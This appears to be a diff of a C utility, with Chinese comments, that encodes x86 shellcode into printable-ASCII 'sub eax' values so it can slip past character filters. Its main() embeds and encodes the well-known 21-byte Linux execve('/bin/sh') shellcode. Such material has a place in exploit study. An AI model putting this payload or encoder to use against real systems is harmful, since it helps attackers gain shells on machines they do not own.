@@ -56,7 +56,7 @@ struct RESULT_BYTE * searchByte(unsigned char target, unsigned char LEFT, unsign
 	int counter = 0;
 
 	while(counter++ < 0xFF){
-		// printf("[TIMES] : [%x]\t", counter);
+		// printf("[TIMES] : [%x]\n", counter);
 		// printf("[%d] [%d] [%d]\n", a, b, c);
 		unsigned char temp = (a + b + c); // 计算和
 		unsigned char *pointer;
@@ -68,13 +68,16 @@ struct RESULT_BYTE * searchByte(unsigned char target, unsigned char LEFT, unsign
 					*pointer = *pointer + 1;
 				}else{
 					if (a < 0x20 || b < 0x20 || c < 0x20){
+						printf("[%x][%x][%x] : 不在范围内 , 自动补 85", a, b, c);
 						// 缠绕一圈
 						a += 85;
-				b += 85;
-					c += 86;
+						b += 85;
+						c += 86;
+						printf("[%x][%x][%x]\n", a, b, c);
 					}
 					
 					struct RESULT_BYTE * result = malloc(sizeof(struct RESULT_BYTE));
+					memset(result, 0, sizeof(struct RESULT_BYTE));
 					result->a = a;
 					result->b = b;
 					result->c = c;
@@ -90,6 +93,7 @@ struct RESULT_BYTE * searchByte(unsigned char target, unsigned char LEFT, unsign
 struct RESULT * search(int target){
 	
 	struct RESULT * result = malloc(sizeof(struct RESULT));
+	memset(result, 0, sizeof(struct RESULT));
 	unsigned char byte_l = (target >> 0) % 0x100;
 	unsigned char byte_ml = (target >> 8) % 0x100;
 	unsigned char byte_mh = (target >> 16) % 0x100;
@@ -97,8 +101,8 @@ struct RESULT * search(int target){
 	int overflow = 0;
 
 	struct RESULT_BYTE * result_byte = NULL;
-	printf("-------------------------\n");
-	printf("Searching : [%d] = [0x%x]\n", byte_l, byte_l);
+	// printf("-------------------------\n");
+	// printf("Searching : [%d] = [0x%x]\n", byte_l, byte_l);
 	result_byte = searchByte(byte_l, 0x20, 0x7f);
 	result->result_a = result->result_a + result_byte->a;//
 	result->result_b = result->result_b + result_byte->b;//
@@ -106,37 +110,37 @@ struct RESULT * search(int target){
 	overflow = result_byte->overflow;
 	free(result_byte);
 
-	printf("-------------------------\n");
-	printf("Searching : [%d] = [0x%x]\n", byte_ml, byte_ml);
+	// printf("-------------------------\n");
+	// printf("Searching : [%d] = [0x%x]\n", byte_ml, byte_ml);
 	result_byte = searchByte(byte_ml - overflow, 0x20, 0x7f);
 	result->result_a = result->result_a + result_byte->a * 0x100;//
 	result->result_b = result->result_b + result_byte->b * 0x100;//
 	result->result_c = result->result_c + result_byte->c * 0x100;//
 	overflow = result_byte->overflow;
 	free(result_byte);
-	printf("-------------------------\n");
-	printf("Searching : [%d] = [0x%x]\n", byte_mh, byte_mh);
+	// printf("-------------------------\n");
+	// printf("Searching : [%d] = [0x%x]\n", byte_mh, byte_mh);
 	result_byte = searchByte(byte_mh - overflow, 0x20, 0x7f);
 	result->result_a = result->result_a + result_byte->a * 0x10000;//
 	result->result_b = result->result_b + result_byte->b * 0x10000;//
 	result->result_c = result->result_c + result_byte->c * 0x10000;//
 	overflow = result_byte->overflow;
 	free(result_byte);
-	printf("-------------------------\n");
-	printf("Searching : [%d] = [0x%x]\n", byte_h, byte_h);
+	//printf("-------------------------\n");
+	//printf("Searching : [%d] = [0x%x]\n", byte_h, byte_h);
 	result_byte = searchByte(byte_h - overflow, 0x20, 0x7f);
 	result->result_a = result->result_a + result_byte->a * 0x1000000;//
 	result->result_b = result->result_b + result_byte->b * 0x1000000;//
 	result->result_c = result->result_c + result_byte->c * 0x1000000;//
 	overflow = result_byte->overflow;
 	free(result_byte);
-	printf("-------------------------\n");
+	// printf("-------------------------\n");
 	return result;
 }
 
 unsigned char * build(unsigned char *shellcode){
 	int length = (strlen(shellcode) / 4 + 1) * 4;
-	printf("[RESULT_LENGTH] : %d\n", length);
+	// printf("[RESULT_LENGTH] : %d\n", length);
 	unsigned char *result = malloc(length); // 假设 shellcode 已经去掉了 0 字节
 	memset(result, 0, length);
 	//int i = 0;
@@ -207,13 +211,13 @@ unsigned char * temp(char * shellcode){
 	}
 	int *target = (int *)pointer;
 	for (i = 0; i < (length_malloc / 4); i++){
-		printf("target[%d] -> [%x]\n", i, *target);
+		// printf("target[%d] -> [%x]\n", i, *target);
 		/* 开始算 */
 		search(*target);
 		struct RESULT * result = search(*target);
-		printf("[Target] : 0x%x\n", *target);
-		printf("[FOUND] : \n");
-		printf("[0x%x] [0x%x] [0x%x]\n", result->result_a, result->result_b, result->result_c);
+		 printf("[Target] : 0x%x\n", *target);
+		// printf("[FOUND] : \n");
+		//printf("[0x%x] [0x%x] [0x%x]\n", result->result_a, result->result_b, result->result_c);
 		printf("0x%x + 0x%x + 0x%x\n", result->result_a, result->result_b, result->result_c);
 		free(result);
 		/* 处理下四个字节 */
@@ -221,35 +225,7 @@ unsigned char * temp(char * shellcode){
 	}
 }
 
-int main(){
-	unsigned char shellcode[] = "\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\x99\xcd\x80"; // length = 21
-
-	unsigned char * result = temp(shellcode);
-
-/*
- * >>> hex(0x100000000 - 0x80cd9958)[2:]
- * '7f3266a8L'
- * >>> hex(0x100000000 - 0x0b6ae389)[2:]
- * 'f4951c77L'
- * >>> hex(0x100000000 - 0x6e69622f)[2:]
- * '91969dd1L'
- * >>> hex(0x100000000 - 0x6868732f)[2:]
- * '97978cd1L'
- * >>> hex(0x100000000 - 0x2f6851c9)[2:]
- * 'd097ae37L'
- * >>> hex(0x100000000 - 0x31909090)[2:]
- * 'ce6f6f70L'
- * >>> hex(0x100000000 - 0x90909090)[2:]
- * '6f6f6f70L'
- */
-/*
-	int target = 0x7f3266a8;
-//	int target = 0xf4951c77;
-//	int target = 0x91969dd1;
-//	int target = 0x97978cd1;
-//	int target = 0xd097ae37;
-//	int target = 0xce6f6f70;
-//	int target = 0x6f6f6f70;
+void check(int target){
 
 	struct RESULT * result = search(target);
 	printf("[Target] : 0x%x\n", target);
@@ -258,8 +234,49 @@ int main(){
 	printf("0x%x + 0x%x + 0x%x\n", result->result_a, result->result_b, result->result_c);
 	printf("sub eax, %xH\nsub eax, %xH\nsub eax, %xH\n", result->result_a, result->result_b, result->result_c);
 	free(result);
-*/
+
 }
+
+int main(){
+	char *shellcode = "\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\x99\xcd\x80";
+	temp(shellcode);
+	
+	// check(0x0b6ae389);
+	// check(0x80cd9958);
+	// check(0x6e69622f);
+	// check(0x6868732f);
+	//check(0x2f6851c9);
+	//check(0x31909090);
+	//check(0x90909090);
+	// int target = 0x6f6f6f70;
+	//	int target = 0x6e69622f;
+	/*
+	struct RESULT * result = search(target);
+	printf("[Target] : 0x%x\n", target);
+	printf("[FOUND] : \n");
+	printf("[0x%x] [0x%x] [0x%x]\n", result->result_a, result->result_b, result->result_c);
+	printf("0x%x + 0x%x + 0x%x\n", result->result_a, result->result_b, result->result_c);
+	printf("sub eax, %xH\nsub eax, %xH\nsub eax, %xH\n", result->result_a, result->result_b, result->result_c);
+	free(result);
+
+	// struct RESULT * _result = search(target);
+	printf("[Target] : 0x%x\n", target);
+	printf("[FOUND] : \n");
+	printf("[0x%x] [0x%x] [0x%x]\n", _result->result_a, _result->result_b, _result->result_c);
+	printf("0x%x + 0x%x + 0x%x\n", _result->result_a, _result->result_b, _result->result_c);
+	printf("sub eax, %xH\nsub eax, %xH\nsub eax, %xH\n", _result->result_a, _result->result_b, _result->result_c);
+	free(_result);
+*/
+/*
+	struct RESULT * _result = search(target);
+	printf("[Target] : 0x%x\n", target);
+	printf("[FOUND] : \n");
+	printf("[0x%x] [0x%x] [0x%x]\n", result->result_a, result->result_b, result->result_c);
+	printf("0x%x + 0x%x + 0x%x\n", result->result_a, result->result_b, result->result_c);
+	printf("sub eax, %xH\nsub eax, %xH\nsub eax, %xH\n", result->result_a, result->result_b, result->result_c);
+	free(result);
+*/
+	}
 
 // 产生一个问题 :
 // C语言在计算立即数的时候的内存是怎么分配的
